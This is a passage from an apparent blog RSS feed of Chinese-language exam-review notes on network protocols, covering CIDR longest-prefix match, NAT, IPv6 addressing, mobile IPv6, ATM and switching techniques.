id=&#34;前缀最长匹配longest-prefix-match&#34;&gt;前缀最长匹配(Longest-prefix Match)&lt;/h4&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;在CIDR中，如果路由器上的路由表中有多条表项满足要求，则采用前缀最长匹配规则&lt;/li&gt;&#xA;&lt;li&gt;前缀最长匹配：R0上对于目的地址为200.25.22.32的IP分组分组，匹配的路由表表项包括200.25.16.0/21和200.25.22.0/24，但使用最长匹配规则选择200.25.22.0/24&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;nat&#34;&gt;NAT&lt;/h3&gt;&#xA;&lt;p&gt;根据作用范围的不同，分两种IP地址&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;全局IP地址：用于Internet上的分组转发，要求在Internet范围内唯一，&lt;/li&gt;&#xA;&lt;li&gt;私有IP地址：用于指定网络内的分组转发，只要求在指定网内部唯一&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;基本nat只使用ip地址信息&#34;&gt;基本NAT：只使用IP地址信息&lt;/h4&gt;&#xA;&lt;p&gt;最简单的NAT还是需要多个全局的IP地址，一般在NAT设备上维护一个address pool，address pool中地址的数量应该多于有访问外部网络需求的主机的数量。&lt;/p&gt;&#xA;&lt;h4 id=&#34;网络地址和端口转换napt&#34;&gt;网络地址和端口转换NAPT&lt;/h4&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;最常用的一种NAT方式&lt;/li&gt;&#xA;&lt;li&gt;使用IP地址和TCP/UDP端口号&lt;/li&gt;&#xA;&lt;li&gt;NAPT操作不仅仅要修改分组的IP头标，还要修改TCP/UDP头标中的端口号&#xA;&lt;ul&gt;&#xA;&lt;li&gt;在NAT设备上，虽然内部网络所有的主机共享同一个全局IP地址，但是经过NAT之后不同会话使用的端口号不同&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;局限性&#34;&gt;局限性&lt;/h4&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;地址和端口转换将带来比较大的开销&lt;/li&gt;&#xA;&lt;li&gt;IP地址和端口号可能存在于载荷的任何位置，因此需要软件针对具体的应用做额外的处理&lt;/li&gt;&#xA;&lt;li&gt;并不是所有的数据都是使用UDP或者TCP来传输&lt;/li&gt;&#xA;&lt;li&gt;破坏了原有的主机到主机的通信模型&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;ipv6地址&#34;&gt;IPv6地址&lt;/h2&gt;&#xA;&lt;p&gt;&lt;!-- raw HTML omitted --&gt;目前所有IPv6子网的前缀长度都是64比特！&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;类型&#34;&gt;类型&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;单播地址(Unicast)&#xA;&lt;ul&gt;&#xA;&lt;li&gt;分配给节点上的某个特定网络接口,目的地为单播地址的分组被转发到该接口上&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;组播/多播地址(Multicast)&#xA;&lt;ul&gt;&#xA;&lt;li&gt;分配给一组网络接口，这些网络接口一般位于不同的节点，目的地为组播地址被转发到这组接口上&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;任播地址(Anycast)&#xA;&lt;ul&gt;&#xA;&lt;li&gt;分配给一组网络接口,这些网络接口一般位于不同的网络节点，目的地为任播地址的分组被转发到该组接口中距离发送主机最近的节点(依据路由协议度量的最近距离)&lt;/li&gt;&#xA;&lt;li&gt;Anycast 地址从单播地址空间分配，只能被分配给路由器，并且不能用作源地址，用于基于UDP的DNS查询（无状态，无连接），应用范围：站点范围，全局使用还需进一步考虑&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;单播地址&#34;&gt;单播地址&lt;/h3&gt;&#xA;&lt;p&gt;有些机制，特别是自动配置机制，所需的信息在子网范围内都可以获得，例如获取目标的MAC地址、获取子网前缀等，不需要全局的IPv6地址&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;链路局部地址（Link-Local）：作用范围为链路，在链路范围内分配&#xA;&lt;ul&gt;&#xA;&lt;li&gt;前面10比特固定为1111 1110 10，接下来为54比特的0，具有形式&lt;strong&gt;FE80:/64&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Interface ID：标识主机上的特定接口&lt;/li&gt;&#xA;&lt;li&gt;链路局部地址总是自动配置，只用于链路范围内的数据传输&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;唯一本地地址（Unique Local）：与IPv4私有地址类似，一般限制在组织机构内部使用，但不会被转换成全局单播地址&lt;/li&gt;&#xA;&lt;li&gt;全局（Global）：作用范围为全局，在全局范围进行分配&#xA;![[Pasted image 20240102122226.png]]&#xA;&lt;ul&gt;&#xA;&lt;li&gt;前面3比特固定为001，第1个16比特为2000到3FFF&lt;/li&gt;&#xA;&lt;li&gt;Global Routing Prefix：全局路由前缀，由服务提供商(ISP)分配给用户站点（Site）的前缀&lt;/li&gt;&#xA;&lt;li&gt;Subnet ID：标识特定的子网，一个站点中可能有多个子网&lt;/li&gt;&#xA;&lt;li&gt;Interface ID：标识主机上的特定接口，大多数情况下长度为64&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;单播地址的组成&#xA;![[Pasted image 20240102122046.png]]&lt;/p&gt;</description>
    </item>
    <item>
      <title>信息网络协议基础第四章复习</title>
      <link>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E7%AC%AC%E5%9B%9B%E7%AB%A0-ip%E7%BD%91%E7%BB%9C%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86/</link>
      <pubDate>Tue, 02 Jan 2024 13:27:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E7%AC%AC%E5%9B%9B%E7%AB%A0-ip%E7%BD%91%E7%BB%9C%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86/</guid>
      <description>&lt;h2 id=&#34;移动切换&#34;&gt;移动切换&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;两种切换情况&#xA;&lt;ul&gt;&#xA;&lt;li&gt;切换涉及的AP在同一个网络中-链路层切换&#xA;&lt;ul&gt;&#xA;&lt;li&gt;链路层切换不改变IP地址，执行链路层操作&lt;/li&gt;&#xA;&lt;li&gt;&lt;!-- raw HTML omitted --&gt;不改变五元组，对应用会话无影响&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;切换涉及的AP在不同的网络中-网络层切换&#xA;&lt;ul&gt;&#xA;&lt;li&gt;不同网络不同AP之间的切换首先执行链路层切换，再执行网络层切换，进行网络相关参数配置&lt;/li&gt;&#xA;&lt;li&gt;&lt;!-- raw HTML omitted --&gt;移动节点IP地址发生变化&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;li&gt;如何消除切换对应用会话的影响？&#xA;&lt;ul&gt;&#xA;&lt;li&gt;应用层解决方案：需要应用支持，本质上是重新建立IP会话&lt;/li&gt;&#xA;&lt;li&gt;网络层解决方案：需要增强网络协议，对应用透明&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;应用会话大多通过五元组来标识&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&amp;lt;源/目的IP地址、协议、源/目的端口号&amp;gt;&lt;/li&gt;&#xA;&lt;li&gt;不同的五元组对应着不同的应用会话&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;移动ipv6&#34;&gt;移动IPv6&lt;/h2&gt;&#xA;&lt;p&gt;– 基本原理、如何对上层应用屏蔽移动性？&lt;/p&gt;&#xA;&lt;h3 id=&#34;基本关键词&#34;&gt;基本关键词&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;家乡地址(HoA)：移动节点的标识，手动配置或者由家乡网络分配，通常不变&lt;/li&gt;&#xA;&lt;li&gt;转交地址(CoA)：移动节点位置的标识，由移动到的外地网络分配，随位置变化&lt;/li&gt;&#xA;&lt;li&gt;HoA与CoA的对应关系称为绑定(Binding)&amp;lt;HoA, CoA&amp;gt;&lt;/li&gt;&#xA;&lt;li&gt;家乡代理(Home Agent)：保存移动节点的家乡地址和转交地址之间的映射关系(绑定)&#xA;IP分组先发送到家乡代理，由家乡代理发送给移动节点！&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;过程&#34;&gt;过程&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;移动检测&#xA;&lt;ul&gt;&#xA;&lt;li&gt;移动节点检测到自己移动到了外地网络&lt;/li&gt;&#xA;&lt;li&gt;路由器公告&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;转交地址配置&lt;/li&gt;&#xA;&lt;li&gt;&amp;lt;家乡地址、转交地址&amp;gt;的绑定注册&#xA;&lt;ul&gt;&#xA;&lt;li&gt;到家乡代理&lt;/li&gt;&#xA;&lt;li&gt;到通信对端&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;家乡代理拦截到移动节点地址的分组&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;对ip以上层屏蔽移动性&#34;&gt;对IP以上层屏蔽移动性&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;双向隧道模式&#xA;&lt;ul&gt;&#xA;&lt;li&gt;移动节点和通信对端的通信始终使用家乡地址进行通信&lt;/li&gt;&#xA;&lt;li&gt;移动节点的移动由家乡代理跟踪，对于通信对端来说是透明的&lt;/li&gt;&#xA;&lt;li&gt;所有的通信都必须通过家乡代理转发&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;路由优化模式&#xA;通信对端知道移动节点当前的转交地址。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;pmipv6&#34;&gt;PMIPv6&lt;/h2&gt;&#xA;&lt;h3 id=&#34;引入原因&#34;&gt;引入原因•&lt;/h3&gt;&#xA;&lt;p&gt;为什么引入代理移动IPv6？&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;更加易于部署&lt;/li&gt;&#xA;&lt;li&gt;更加易于管理&lt;/li&gt;&#xA;&lt;li&gt;更好的性能&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;网络端控制的移动管理&#xA;&lt;ul&gt;&#xA;&lt;li&gt;在网络中引入一个功能实体代理移动节点执行与家乡代理之间的信令&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;本地移动管理&#xA;&lt;ul&gt;&#xA;&lt;li&gt;在本地管理域中引入一个类似家乡代理的功能实体，负责管理域内的移动管理操作&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;</description>
    </item>
    <item>
      <title>信息网络协议基础第二章复习</title>
      <link>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%BA%8C%E7%AB%A0/</link>
      <pubDate>Tue, 02 Jan 2024 11:54:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%BA%8C%E7%AB%A0/</guid>
      <description>&lt;h2 id=&#34;接入网&#34;&gt;接入网&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;用来把用户网络或者设备接入到Internet的网络&lt;/li&gt;&#xA;&lt;li&gt;也被称为最后1公里接入&lt;/li&gt;&#xA;&lt;li&gt;宽带接入成为主流（FCC [2010]: 4Mbps downstream/1Mbps upstream)&lt;/li&gt;&#xA;&lt;li&gt;DSL、Cable、Fibre、Wireless Broadband (Fixed/Mobile)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;常用接入网类型&#34;&gt;常用接入网类型&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;基于ATM架构类&#xA;&lt;ul&gt;&#xA;&lt;li&gt;传统电信网络：&lt;!-- raw HTML omitted --&gt;点对点&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;li&gt;DSL（数字用户线路）&#xA;&lt;ul&gt;&#xA;&lt;li&gt;对称DSL&#xA;&lt;ul&gt;&#xA;&lt;li&gt;下行和上行速率相同SHDSL(利用了话音带宽）&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;非对称DSL&#xA;&lt;ul&gt;&#xA;&lt;li&gt;下行速率一般大于上行速率&lt;/li&gt;&#xA;&lt;li&gt;ADSL&lt;/li&gt;&#xA;&lt;li&gt;ADSL2+:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;基于IEEE 802参考模型的局域网架构类&#xA;&lt;ul&gt;&#xA;&lt;li&gt;新兴IP网络：&lt;!-- raw HTML omitted --&gt;共享&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;&#xA;&lt;li&gt;以太网（802.3）、无线局域网（802.11）、甚至包括无线城域网（802.16）&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;光纤接入类&#xA;&lt;ul&gt;&#xA;&lt;li&gt;基于ATM：APON、GPON&lt;/li&gt;&#xA;&lt;li&gt;基于以太网：EPON&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;atm&#34;&gt;ATM&lt;/h2&gt;&#xA;&lt;h3 id=&#34;概述&#34;&gt;概述&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;ATM： Asynchronous Transfer Mode，异步传输模式&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;既可用于接入网，也可以用于核心网&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;面向连接的分组交换/虚电路交换&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Q.2931：连接建立信令&lt;/li&gt;&#xA;&lt;li&gt;信元：基本交换单位，固定长度（5字节头标＋48字节数据）&lt;/li&gt;&#xA;&lt;li&gt;==为什么选择固定长度（53字节）的信元？==&#xA;&lt;ul&gt;&#xA;&lt;li&gt;==1）构建硬件简单==&lt;/li&gt;&#xA;&lt;li&gt;==2）交换单元并行处理==&lt;/li&gt;&#xA;&lt;li&gt;==3）队列行为优化：控制延迟、提高队列处理效率==&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;信元&#34;&gt;信元&lt;/h3&gt;&#xA;&lt;p&gt;队列优化举例：&#xA;假设：链路带宽100Mbps，队列中的分组具有不同的优先级&#xA;变长分组网络：最大分组长度为4KB，在交换机开始传输一个4KB的分组之后到达一个高优先级的分组，必须在队列中等待327.68us才能通过输出端口传输（4KB= 32768b）&#xA;ATM网络：信元固定长度为53B，最长等待时间将是53×8/100=4.24us，而且这个时间是固定的&#xA;结论：使用固定长度信元具有控制延迟的能力，特别是控制延迟抖动的能力，这对某些应用例如实时应用非常重要&lt;/p&gt;&#xA;&lt;h3 id=&#34;业务类型&#34;&gt;业务类型&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;CBR业务  Constant Bit Rate&#xA;&lt;ul&gt;&#xA;&lt;li&gt;提供&lt;!-- raw HTML omitted --&gt;最高程度&lt;!-- raw HTML omitted --&gt;的服务质量保证，保证带宽、延迟抖动&lt;/li&gt;&#xA;&lt;li&gt;话音、视频等&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;VBR业务  Variable Bit Rate&#xA;&lt;ul&gt;&#xA;&lt;li&gt;业务产生的数据可能是突发的，要求延迟抖动小&lt;/li&gt;&#xA;&lt;li&gt;具有突发性，可保证最大延迟，压缩话音、视频&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;ABR业务  Available Bit Rate&#xA;&lt;ul&gt;&#xA;&lt;li&gt;利用剩余带宽，根据网络可用带宽和拥塞状态来调整传输速率&lt;/li&gt;&#xA;&lt;li&gt;文件传输、email等&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;UBR业务  Unspecified Bit Rate&#xA;&lt;ul&gt;&#xA;&lt;li&gt;利用剩余带宽，对延迟和延迟抖动没有严格要求的业务&lt;/li&gt;&#xA;&lt;li&gt;文件传输、email等&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;虚电路&#34;&gt;虚电路&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;虚电路VPI和VCI来标识&#xA;&lt;ul&gt;&#xA;&lt;li&gt;VPI：Virtual Path Identification，虚路径标识&lt;/li&gt;&#xA;&lt;li&gt;VCI：Virtual Channel Identification，虚通道标识&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Why VPI+VCI？&#xA;&lt;ul&gt;&#xA;&lt;li&gt;VPI用于网络的主干中进行切换。它在ATM交换机上起到多路复用/解复用的作用，将来自各种源（ATM接口）的虚拟信道（VCs）汇聚到一个接口上的虚拟路径&lt;/li&gt;&#xA;&lt;li&gt;另一方面，VCI用于在私有网络内标识连接。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Permanent Virtual Circuit (PVC)&#xA;&lt;ul&gt;&#xA;&lt;li&gt;PVC是一种永久建立的连接，它使得在节点之间的物理连接上创建逻辑连接成为可能，这些节点经常或连续地进行通信&lt;/li&gt;&#xA;&lt;li&gt;网络设备的VPI/VCI表格可以由管理员进行更新&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Switched Virtual Circuit (SVC)&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Switched Virtual Circuit (SVC) 是一种在数据通信网络中在两个网络设备之间建立的临时逻辑连接&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;信元格式&#34;&gt;信元格式&lt;/h3&gt;&#xA;&lt;p&gt;![[图片 1.png]]&lt;/p&gt;</description>
    </item>
    <item>
      <title>信息网络协议基础第一章复习</title>
      <link>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%B8%80%E7%AB%A0/</link>
      <pubDate>Tue, 02 Jan 2024 08:27:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%B8%80%E7%AB%A0/</guid>
      <description>&lt;h2 id=&#34;交换技术&#34;&gt;交换技术&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;交换、电路交换、分组交换（虚电路交换ATM、数据报交换IP）- 原理 特点&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;为什么需要交换&#34;&gt;为什么需要交换？&lt;/h3&gt;&#xA;&lt;p&gt;减少网络中节点之间所需的通信线路&#xA;增强可扩展性,构建更大规模网络&lt;/p&gt;&#xA;&lt;h3 id=&#34;交换类型&#34;&gt;交换类型&lt;/h3&gt;&#xA;&lt;p&gt;![[Pasted image 20240101134814.png]]&lt;/p&gt;&#xA;&lt;h3 id=&#34;交换的概念&#34;&gt;交换的概念&lt;/h3&gt;&#xA;&lt;p&gt;交换操作由一系列过程组成：为输入数据选择输出线路/端口，在输入和输出之间建立连接，通过该连接将数据放到输出线路/端口上&#xA;网络中执行交换操作的设备称为交换机。通过一系列交换机的交换操作，在两个通信节点之间建立一条数据传输路径，这条路径由物理或者逻辑上的链路组成&lt;/p&gt;&#xA;&lt;h3 id=&#34;电路交换&#34;&gt;电路交换&lt;/h3&gt;&#xA;&lt;h4 id=&#34;电路交换概念&#34;&gt;电路交换：概念&lt;/h4&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;交换传输线路或者时隙，通过交换机在通信双方之间建立一条专用的传输路径&lt;/li&gt;&#xA;&lt;li&gt;传输路径建立后，数据像流一样在路径上传输&#xA;&lt;ul&gt;&#xA;&lt;li&gt;空分交换：传输路径由线路组成&lt;/li&gt;&#xA;&lt;li&gt;时分交换：传输路径由每条线路上的固定时隙组成&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;电路交换特征&#34;&gt;电路交换：特征&lt;/h4&gt;&#xA;&lt;p&gt;网络通信包括三个过程&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;（发送）端到（接收）端电路连接建立&lt;/li&gt;&#xA;&lt;li&gt;数据传输&lt;/li&gt;&#xA;&lt;li&gt;电路连接拆除&#xA;优点：占用固定的线路资源，保证数据传输的速率、延时、可靠性及有序性&#xA;缺点：线路资源利用率低，没有有数据传输时也占用线路或者固定时隙；电路连接建立导致延迟&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;电路交换性能&#34;&gt;电路交换：性能&lt;/h4&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;电路交换是为话音传输设计的，支持固定的数据速率&lt;/li&gt;&#xA;&lt;li&gt;电话交换网：传统电话网络中的话音业务采用电路交换技术，除端局到用户的本地回路(Subscriber Loop)是模拟的以外，其它部分都是数字的。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;分组交换&#34;&gt;分组交换&lt;/h3&gt;&#xA;&lt;h4 id=&#34;分组交换概念&#34;&gt;分组交换：概念&lt;/h4&gt;&#xA;&lt;p&gt;交换分组，以分组为单元统计复用线路（也称为链路）资源&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;统计复用：只有有数据要传输才占用线路&lt;/li&gt;&#xA;&lt;li&gt;分组大小问题：太小，分组开销大；太大，复用效率低，影响其它分组的发送&#xA;现代的电话网络支持话音、数据等综合业务，对于数据采用分组交换技术&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;数据报交换&#34;&gt;数据报交换&lt;/h4&gt;&#xA;&lt;p&gt;数据报交换：直接发送分组&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;特征&#xA;&lt;ul&gt;&#xA;&lt;li&gt;无连接：直接发送分组，无服务质量保证&lt;/li&gt;&#xA;&lt;li&gt;健壮性：相同源-目的的分组可能沿不同路径传输，可绕开故障路径&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;路由表&#xA;&lt;ul&gt;&#xA;&lt;li&gt;分组携带的控制信息中包含目的地址&#xA;&lt;ul&gt;&#xA;&lt;li&gt;目的地址在传输过程中&lt;strong&gt;保持不变&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;交换机根据路由表来独立地转发分组&#xA;&lt;ul&gt;&#xA;&lt;li&gt;使用目的地址来查找&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;性能&#xA;&lt;ul&gt;&#xA;&lt;li&gt;IP网络采用数据报交换，在网络层执行交换，交换的单元为IP分组，执行交换的设备也被称为IP路由器&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;虚电路交换&#34;&gt;虚电路交换&lt;/h4&gt;&#xA;&lt;p&gt;虚电路交换：先建立连接，再发送分组&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;特征&#xA;&lt;ul&gt;&#xA;&lt;li&gt;面向连接：分组发送前在源和目的之间建立连接&#xA;&lt;ul&gt;&#xA;&lt;li&gt;与电路交换不同，连接不是占用固定的线路资源，只是告诉网络的资源需求，在每个交换机上建立“连接状态”&lt;/li&gt;&#xA;&lt;li&gt;建立的连接路径被称为&lt;strong&gt;虚电路&lt;/strong&gt;（Virtual Circuit）&lt;/li&gt;&#xA;&lt;li&gt;服务质量保证&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;有序性：同一源和目的的分组沿相同的路径到达目的地&lt;/li&gt;&#xA;&lt;li&gt;基于虚电路标识执行交换操作，效率高&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;虚电路&#xA;&lt;ul&gt;&#xA;&lt;li&gt;VCI（VC Identifier）：在每条物理线路/链路可以同时运行很多条虚电路，每条虚电路由VCI标识&lt;/li&gt;&#xA;&lt;li&gt;VCI具有局部意义，只在每条链路上唯一&lt;/li&gt;&#xA;&lt;li&gt;每个交换机上都维护一个转发表，基于VCI对分组进行转发&lt;/li&gt;&#xA;&lt;li&gt;从源到目的的虚电路由路径链路上一系列VCI标识&#xA;![[Pasted image 20240101134653.png]]&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;性能&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;ATM网络&lt;/strong&gt;采用虚电路交换，交换的单元为固定长度的ATM 信元，执行交换的设备也被称为ATM交换机&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;总结&#xA;&lt;ul&gt;&#xA;&lt;li&gt;以分组为单元统计复用线路/链路资源&lt;/li&gt;&#xA;&lt;li&gt;优点：线路利用率高，节点只有在有数据要传输时才占用通信线路，因此多个节点的分组可以共享一条通信线路&lt;/li&gt;&#xA;&lt;li&gt;缺点：需要资源管理机制来保证数据传输的速率、延时、可靠性和有序性，增加了复杂性&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;分组交换是为数据传输设计的，支持可变的数据速率&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;网络体系结构&#34;&gt;网络体系结构&lt;/h2&gt;&#xA;&lt;h3 id=&#34;dtn体系架构&#34;&gt;DTN体系架构&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;解决的问题&#xA;传统网络路由假设：在任何时候，总能找到从源到目的的端到端路径。&#xA;DTN网络环境：由于连接的间隙性，可能会出现端到端路径不存在的情况&lt;/li&gt;&#xA;&lt;li&gt;基本思想：走一步看一步，而不像传统路由那样直接找到从源到目的的路径。关键问题：下一步如何确定？&#xA;&lt;ul&gt;&#xA;&lt;li&gt;最简单的策略：把数据交给我当前能通信的所有节点（感染路由），性能最好，开销最大！&lt;/li&gt;&#xA;&lt;li&gt;更复杂的策略：根据一些知识来选择数据转发的下一跳（单拷贝/多拷贝路由），例如历史相遇信息，节点运动信息等，这可以减小开销，但是性能会下降。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;DTN中引入了Bundle Protocol （BP），可以在TCP/IP和非TCP/IP网络中运行，BP实现Custody Transfer&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 